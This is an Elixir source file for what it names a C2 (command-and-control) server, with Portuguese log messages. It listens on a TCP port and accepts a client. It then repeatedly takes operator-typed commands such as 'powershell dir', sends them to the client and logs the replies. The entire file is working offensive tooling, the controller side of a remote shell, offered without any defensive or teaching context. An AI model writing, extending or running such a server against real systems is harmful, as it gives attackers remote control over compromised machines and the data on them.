defmodule ElixirC2Server do
  require Logger

  @server_start_msg "C2 ouvindo na porta: "
  @data_received_msg "Recebido: "
  @data_receive_error_msg "Erro ao receber dados: "

  @doc """
  Inicia o servidor C2 ouvindo na porta especificada.
  """
  def start_listening(port) do
    {:ok, socket} = :gen_tcp.listen(port, [:binary, packet: :raw, active: false, reuseaddr: true])
    Logger.info(@server_start_msg <> Integer.to_string(port))
    {:ok, client} = :gen_tcp.accept(socket)
    Logger.info("Cliente conectado")
    command_loop(client)
  end

  defp command_loop(client) do
    command = IO.gets("Digite o comando para enviar ao cliente (ex: powershell dir): ")

    case command do
      :eof ->
        Logger.info("Encerrando servidor.")
        :gen_tcp.close(client)

      _ ->
        send_command(client, String.trim(command))
        receive_response(client)
        command_loop(client)
    end
  end

  defp send_command(client, command) do
    :gen_tcp.send(client, command <> "\n")
  end

  defp receive_response(socket) do
    case :gen_tcp.recv(socket, 0) do
      {:ok, response} ->
        Logger.info(@data_received_msg <> response)

      {:error, reason} ->
        Logger.error(@data_receive_error_msg <> inspect(reason))
    end
  end
end
